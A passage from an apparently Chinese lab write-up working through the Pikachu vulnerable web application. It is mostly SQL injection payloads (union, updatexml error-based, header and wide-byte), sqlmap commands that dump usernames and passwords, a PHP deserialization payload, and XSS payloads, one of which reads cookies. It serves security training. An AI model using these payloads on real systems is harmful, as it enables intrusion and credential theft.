<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="comment">// 后续也可以检查文件名是否符合预期的格式，例如只允许字母、数字和下划线等字符</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$filename</span>))&#123;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="五、SQL注入"><a href="#五、SQL注入" class="headerlink" title="五、SQL注入"></a>五、SQL注入</h2><h3 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1 数字型注入"></a>1 数字型注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># POST请求如下</span><br><span class="line"># <span class="number">1.</span>列数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span>#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> &quot;users&quot;#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"></span><br><span class="line"># <span class="number">5.</span>数据</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(username,&quot; &quot;,password),<span class="number">2</span> <span class="keyword">from</span> users#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br></pre></td></tr></table></figure><h3 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2 字符型注入"></a>2 字符型注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">GET</span>请求如下</span><br><span class="line"># <span class="number">1.</span>列数</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3#&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2.库名</span></span><br><span class="line"><span class="string">?name=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span>#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>表名</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select group_concat(table_name),2 from information_schema.tables where table_schema = database()#&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4.列名</span></span><br><span class="line"><span class="string">?name=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> &quot;users&quot;#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"></span><br><span class="line"># <span class="number">5.</span>数据</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select group_concat(username,&quot; &quot;,password),2 from users -- &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure><h3 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3 搜索型注入"></a>3 搜索型注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 同理于字符型，把name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; 改成 name=1%&#x27;</span>，同时本次注入的表有三列，所以要<span class="keyword">select</span>三个参数</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; union select group_concat(username,&quot; &quot;,password),2,3 from users -- &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure><h3 id="4-xx型注入"><a href="#4-xx型注入" class="headerlink" title="4 xx型注入"></a>4 xx型注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 同理于字符型，只是把name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; 改成 name=1&#x27;</span>)即可</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; union select group_concat(username,&quot; &quot;,password),2 from users -- &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure><h3 id="5-“insert-update”注入"><a href="#5-“insert-update”注入" class="headerlink" title="5 “insert/update”注入"></a>5 “insert/update”注入</h3><blockquote><p>报错：<code>Warning:  Use of undefined constant MYSQL_ASSOC...\sqli_mem.php on line 66</code></p><p>解决方法：修改sqli_mem.php的66行为<code>$data=mysqli_fetch_array($result, MYSQLI_ASSOC);</code></p><p>报错：<code>Warning:  Use of undefined constant MYSQL_ASSOC ...\sqli_edit.php on line 75</code></p><p>解决方法：修改sqli_edit.php的75行为<code>$data=mysqli_fetch_array($result, MYSQLI_ASSOC);</code></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">insert</span>的URL为：http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_iu<span class="operator">/</span>sqli_reg.php</span><br><span class="line"># POST请求如下</span><br><span class="line"># <span class="number">1.</span>猜闭合</span><br><span class="line">username<span class="operator">=</span>xixi<span class="string">&#x27;,&#x27;</span><span class="number">111</span><span class="string">&#x27;)#&amp;password=a&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2.库名</span></span><br><span class="line"><span class="string">username=xixi&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&amp;password=a&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 3.表名</span></span><br><span class="line"><span class="string">username= &#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&amp;password=a&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4.列名</span></span><br><span class="line"><span class="string">payload：username= &#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&amp;password=a&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 5.数据</span></span><br><span class="line"><span class="string">username= &#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(concat(username,<span class="string">&#x27;;&#x27;</span>,password)) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&amp;password=a&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># update的URL为：http://127.0.0.1/pikachu/vul/sqli/sqli_iu/sqli_edit.php</span></span><br><span class="line"><span class="string"># POST请求如下</span></span><br><span class="line"><span class="string"># 1.猜闭合</span></span><br><span class="line"><span class="string">sex=1&#x27;&#x27;&amp;phonenum=phone&amp;add=301&amp;email=%E7%BF%BB%E6%96%97%E5%A4%A7%E8%A1%97%E7%BF%BB%E6%96%97%E8%8A%B1%E5%9B%AD&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2.库名</span></span><br><span class="line"><span class="string">sex=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) # <span class="operator">&amp;</span>phonenum<span class="operator">=</span>phone<span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span><span class="number">301</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span>BF<span class="operator">%</span>BB<span class="operator">%</span>E6<span class="operator">%</span><span class="number">96</span><span class="operator">%</span><span class="number">97</span><span class="operator">%</span>E5<span class="operator">%</span>A4<span class="operator">%</span>A7<span class="operator">%</span>E8<span class="operator">%</span>A1<span class="operator">%</span><span class="number">97</span><span class="operator">%</span>E7<span class="operator">%</span>BF<span class="operator">%</span>BB<span class="operator">%</span>E6<span class="operator">%</span><span class="number">96</span><span class="operator">%</span><span class="number">97</span><span class="operator">%</span>E8<span class="operator">%</span><span class="number">8</span>A<span class="operator">%</span>B1<span class="operator">%</span>E5<span class="operator">%</span><span class="number">9</span>B<span class="operator">%</span>AD<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>表名</span><br><span class="line">sex<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) #&amp;phonenum=phone&amp;add=301&amp;email=%E7%BF%BB%E6%96%97%E5%A4%A7%E8%A1%97%E7%BF%BB%E6%96%97%E8%8A%B1%E5%9B%AD&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4.列名</span></span><br><span class="line"><span class="string">sex=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #<span class="operator">&amp;</span>phonenum<span class="operator">=</span>phone<span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span><span class="number">301</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span>BF<span class="operator">%</span>BB<span class="operator">%</span>E6<span class="operator">%</span><span class="number">96</span><span class="operator">%</span><span class="number">97</span><span class="operator">%</span>E5<span class="operator">%</span>A4<span class="operator">%</span>A7<span class="operator">%</span>E8<span class="operator">%</span>A1<span class="operator">%</span><span class="number">97</span><span class="operator">%</span>E7<span class="operator">%</span>BF<span class="operator">%</span>BB<span class="operator">%</span>E6<span class="operator">%</span><span class="number">96</span><span class="operator">%</span><span class="number">97</span><span class="operator">%</span>E8<span class="operator">%</span><span class="number">8</span>A<span class="operator">%</span>B1<span class="operator">%</span>E5<span class="operator">%</span><span class="number">9</span>B<span class="operator">%</span>AD<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br><span class="line"></span><br><span class="line"># <span class="number">5.</span>数据</span><br><span class="line">sex<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;</span><span class="operator">^</span><span class="string">&#x27;,password)) from users),1,31),0x7e),1) #&amp;phonenum=phone&amp;add=301&amp;email=%E7%BF%BB%E6%96%97%E5%A4%A7%E8%A1%97%E7%BF%BB%E6%96%97%E8%8A%B1%E5%9B%AD&amp;submit=submit</span></span><br></pre></td></tr></table></figure><h3 id="6-“delete”注入"><a href="#6-“delete”注入" class="headerlink" title="6 “delete”注入"></a>6 “delete”注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">GET</span>请求如下</span><br><span class="line"># <span class="number">1.</span>库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>表名</span><br><span class="line">?id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>列名</span><br><span class="line">?id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>数据</span><br><span class="line">?id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(concat(username,<span class="string">&#x27;^&#x27;</span>,password)) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><h3 id="7-“http-header”注入"><a href="#7-“http-header”注入" class="headerlink" title="7 “http header”注入"></a>7 “http header”注入</h3><blockquote><p>先登录，登录会发一个包，登录成功会再发一个包。抓取第二个包进行操作。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 修改<span class="keyword">User</span><span class="operator">-</span>Agent</span><br><span class="line"># <span class="number">1.</span>猜闭合</span><br><span class="line"><span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> #</span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>库名</span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span></span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>表名</span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or &#x27;</span></span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>列名</span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),1,31),0x7e),1) or &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="number">5.</span>数据</span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;</span> <span class="string">&#x27;,password)) from users),1,31),0x7e),1) or &#x27;</span></span><br></pre></td></tr></table></figure><h3 id="8-布尔盲注"><a href="#8-布尔盲注" class="headerlink" title="8 布尔盲注"></a>8 布尔盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>库名</span><br><span class="line">python sqlmap <span class="operator">-</span>u <span class="number">172.22</span><span class="number">.124</span><span class="number">.198</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_blind_b.php <span class="comment">--current-db --form</span></span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>表名</span><br><span class="line">python sqlmap <span class="operator">-</span>u <span class="number">172.22</span><span class="number">.124</span><span class="number">.198</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_blind_b.php <span class="operator">-</span>D <span class="string">&#x27;pikachu&#x27;</span> <span class="comment">--tables --form</span></span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>列名</span><br><span class="line">python sqlmap <span class="operator">-</span>u <span class="number">172.22</span><span class="number">.124</span><span class="number">.198</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_blind_b.php <span class="operator">-</span>D <span class="string">&#x27;pikachu&#x27;</span> <span class="operator">-</span>T <span class="string">&#x27;users&#x27;</span> <span class="comment">--columns --form</span></span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>数据</span><br><span class="line">python sqlmap <span class="operator">-</span>u <span class="number">172.22</span><span class="number">.124</span><span class="number">.198</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_blind_b.php <span class="operator">-</span>D <span class="string">&#x27;pikachu&#x27;</span> <span class="operator">-</span>T <span class="string">&#x27;users&#x27;</span> <span class="operator">-</span>C <span class="string">&#x27;username,password&#x27;</span> <span class="comment">--dump --form</span></span><br></pre></td></tr></table></figure><h3 id="9-时间盲注"><a href="#9-时间盲注" class="headerlink" title="9 时间盲注"></a>9 时间盲注</h3><blockquote><p>同理布尔盲注，修改网址即可。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">4.</span>数据</span><br><span class="line">python sqlmap <span class="operator">-</span>u <span class="number">172.22</span><span class="number">.124</span><span class="number">.198</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_blind_t.php <span class="operator">-</span>D <span class="string">&#x27;pikachu&#x27;</span> <span class="operator">-</span>T <span class="string">&#x27;users&#x27;</span> <span class="operator">-</span>C <span class="string">&#x27;username,password&#x27;</span> <span class="comment">--dump --form</span></span><br></pre></td></tr></table></figure><h3 id="10-宽字节注入"><a href="#10-宽字节注入" class="headerlink" title="10 宽字节注入"></a>10 宽字节注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>列数</span><br><span class="line">name<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">81</span><span class="string">&#x27; order by 3 # &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2.库名</span></span><br><span class="line"><span class="string">name=1%81&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">1</span> # <span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 后续是理论payload，实际运行时会报错。</span><br><span class="line"># <span class="number">3.</span>表名</span><br><span class="line">name<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">81</span><span class="string">&#x27; union select group_concat(table_name),2 from information_schema.tables where table_schema = database() # &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4.列名</span></span><br><span class="line"><span class="string">name=1%81&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> &quot;users&quot;#<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"></span><br><span class="line"># <span class="number">5.</span>数据</span><br><span class="line">name<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">81</span><span class="string">&#x27; union select group_concat(username,&quot; &quot;,password),2 from users # &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure><h2 id="六、PHP反序列化"><a href="#六、PHP反序列化" class="headerlink" title="六、PHP反序列化"></a>六、PHP反序列化</h2><h3 id="1-反序列化"><a href="#1-反序列化" class="headerlink" title="1 反序列化"></a>1 反序列化</h3><blockquote><p>通过源码可知服务器会反序列化S类构造的对象并输出系统的test值，所以可以按下列代码构造payload。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 序列化结果</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload：o=O:1:&quot;s&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="七、XSS漏洞"><a href="#七、XSS漏洞" class="headerlink" title="七、XSS漏洞"></a>七、XSS漏洞</h2><h3 id="1-反射型xss-get"><a href="#1-反射型xss-get" class="headerlink" title="1 反射型xss(get)"></a>1 反射型xss(get)</h3><blockquote><p>前端有长度限制。</p><p>可以选择F12解除限制。也可以选择直接构造数据包。</p><p>payload：<code>?message=&lt;script&gt;alert(&#39;111&#39;)&lt;/script&gt;&amp;submit=submit</code></p></blockquote><h3 id="2-反射型xss-post"><a href="#2-反射型xss-post" class="headerlink" title="2 反射型xss(post)"></a>2 反射型xss(post)</h3><blockquote><p>登录后，抓包看post参数，修改即可。</p><p>因为此次登录有cookie，所以可以输出cookie对cookie进行盗取。</p><p>payload：<code>message=&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;submit=submit</code></p></blockquote><h3 id="3-存储型xss"><a href="#3-存储型xss" class="headerlink" title="3 存储型xss"></a>3 存储型xss</h3><blockquote><p>此次构造的语句会存储在服务器中，所以每次打开页面都会触发。</p><p>payload：<code>?message=&lt;script&gt;alert(&#39;111&#39;)&lt;/script&gt;&amp;submit=submit</code></p></blockquote><h3 id="4-DOM型xss"><a href="#4-DOM型xss" class="headerlink" title="4 DOM型xss"></a>4 DOM型xss</h3><blockquote><p>任意输入，F12查看源码，发现主要源码为：<code>document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;;</code></p><p>所以只需构造payload闭合左右即可。</p><p>不要用引号包裹输出的值，引号会被过滤。可以直接不写引号或者用反引号。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">payload：&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(111)</span></span></span><br><span class="line"><span class="tag"><span class="attr">payload</span>：&#x27;&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">111</span>`)</span></span><br></pre></td></tr></table></figure><h3 id="5-DOM型xss-x"><a href="#5-DOM型xss-x" class="headerlink" title="5 DOM型xss-x"></a>5 DOM型xss-x</h3><blockquote><p>任意输入，弹出链接。点击后出现另一条链接。</p><p>F12查看源码，根据源码发现和上一题类似，并且这次的参数在URL中。所以只需在点击第一个链接后把构造payload后回车，页面刷新。然后再次点击第一个链接后就会触发漏洞。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">payload：?text=&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;error&quot;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(`xss`)#</span></span></span><br></pre></td></tr></table></figure><h3 id="6-xss之盲打"><a href="#6-xss之盲打" class="headerlink" title="6 xss之盲打"></a>6 xss之盲打</h3><blockquote><p>抓包，修改参数，直接输入payload：<code>content=&lt;script&gt;alert(&#39;Opinion is an injection point&#39;)&lt;/script&gt;&amp;name=&lt;script&gt;alert(&#39;Name is an injection point&#39;)&lt;/script&gt;&amp;submit=%E6%8F%90%E4%BA%A4</code>。</p><p>没有回显，查看提示是要到后台进行查看。进入后台查看，发现弹出Opinion is an injection point，说明看法输入框和大名输入框都是注入点。</p></blockquote><h3 id="7-xss之过滤"><a href="#7-xss之过滤" class="headerlink" title="7 xss之过滤"></a>7 xss之过滤</h3><blockquote><p>输入<code>&lt;&gt; . * () script img src onerrror</code>，发现只剩下<code>img src onerrror</code>，说明前面的字符可能被过滤。</p><p>所以直接用：<code>?message=&lt;img src=&quot;1&quot; onerror=alert(&#39;111&#39;);&gt;&amp;submit=submit</code></p></blockquote><h3 id="8-xss之htmlspecialchars"><a href="#8-xss之htmlspecialchars" class="headerlink" title="8 xss之htmlspecialchars"></a>8 xss之htmlspecialchars</h3><blockquote><p>有htmlspecialchars()函数对输入进行编码，但是单引号没有被编码且该语句插入在a标签中。</p><p>所以可以用如下payload：<code>?message=&#39; onclick=&#39;alert(123)&amp;submit=submit</code>。闭合引号，将语句插入a标签。</p></blockquote><h3 id="9-xss之href输出"><a href="#9-xss之href输出" class="headerlink" title="9 xss之href输出"></a>9 xss之href输出</h3><blockquote><p>正常输入，F12，发现左右尖括号和单引号被编码了。因为数据直接被插入到a的href中，所以可以直接构造一个<code>javascript:alert(&#39;123&#39;)</code>插入到href中被执行。</p><p>所以payload为：<code>?message=javascript:alert(&#39;123&#39;)&amp;submit=submit</code></p></blockquote><h3 id="10-xss值js输出"><a href="#10-xss值js输出" class="headerlink" title="10 xss值js输出"></a>10 xss值js输出</h3><blockquote><p>随便输入数据，回车。F12，发现数据被插在了<code>$ms=&#39;  &#39;;</code>里面</p><p>所以可以考虑闭合来插入一条独立语句。</p><p>所以payload为：<code>http://127.0.0.1/pikachu/vul/xss/xss_04.php?message=&#39;;alert(&#39;1&#39;);//&amp;submit=submit</code></p></blockquote><h2 id="八、CSRF漏洞"><a href="#八、CSRF漏洞" class="headerlink" title="八、CSRF漏洞"></a>八、CSRF漏洞</h2><blockquote><p>报错：<code>Warning: Use of undefined constant MYSQL_ASSOC...</code></p><p>解决方法：修改对应文件夹下的csrf_get_edit.php的对应行为<code>$data=mysqli_fetch_array($result, MYSQLI_ASSOC);</code></p></blockquote><h3 id="1-CSRF-get"><a href="#1-CSRF-get" class="headerlink" title="1 CSRF (get)"></a>1 CSRF 